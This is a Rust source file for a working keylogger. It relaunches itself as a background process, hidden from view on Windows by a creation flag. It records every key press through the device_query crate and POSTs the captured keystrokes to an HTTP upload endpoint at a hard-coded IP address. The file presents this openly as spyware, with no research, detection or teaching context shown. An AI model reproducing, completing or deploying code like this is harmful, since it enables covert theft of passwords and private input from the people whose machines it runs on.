use device_query::{DeviceQuery, DeviceState, Keycode};

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt; 

use std::process::{Command, Stdio};
use std::time::Duration;

pub fn deploy_keylogger_detached() -> Result<(), Box<dyn std::error::Error>> {
    println!("Deploying keylogger...");

    let exe_path = std::env::current_exe()?;

    #[cfg(target_os = "windows")]
    {
        // Windows-specific detached process handling
        Command::new(exe_path)
            .arg("--background-keylogger")
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .creation_flags(0x08000000) // DOESNT CREATE A WINDOW
            .spawn()?;
    }

    #[cfg(target_os = "linux")]
    {
        // Linux-specific detached process handling
        Command::new(exe_path)
            .arg("--background-keylogger")
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;
    }

    println!("Keylogger is running in the background.");
    Ok(())
}

pub fn handle_background_keylogger() {
    let device_state = DeviceState::new();
    let mut last_keys = vec![];

    println!("Keylogger is active. Logs will be sent directly to the server.");

    loop {
        let keys = device_state.get_keys();

        // Stop the keylogger with Alt+S
        if keys.contains(&Keycode::LAlt) || keys.contains(&Keycode::RAlt) {
            if keys.contains(&Keycode::S) {
                println!("Keylogger stopped by Alt+S.");
                return;
            }
        }

        let mut key_log = String::new();

        for key in keys.iter() {
            if !last_keys.contains(key) {
                let key_string = match key {
                    Keycode::Enter => "\n".to_string(),
                    Keycode::Space => " ".to_string(),
                    Keycode::Tab => "[Tab]".to_string(),
                    Keycode::LShift | Keycode::RShift => "[Shift]".to_string(),
                    Keycode::Backspace => "[Backspace]".to_string(),
                    Keycode::Escape => "[ESC]".to_string(),
                    _ => format!("{:?}", key),
                };

                key_log.push_str(&key_string);
            }
        }

        if !key_log.is_empty() {
            if let Err(e) = send_logs_to_server(&key_log) {
                eprintln!("Failed to send logs to server: {}", e);
            }
        }

        last_keys = keys;
        std::thread::sleep(Duration::from_millis(50));
    }
}

fn send_logs_to_server(key_log: &str) -> Result<(), Box<dyn std::error::Error>> {
    let response = ureq::post("http://192.168.153.129:5000/upload")
        .send_string(key_log);

    if let Err(e) = response {
        eprintln!("Failed to send logs: {}", e);
    }

    Ok(())
}
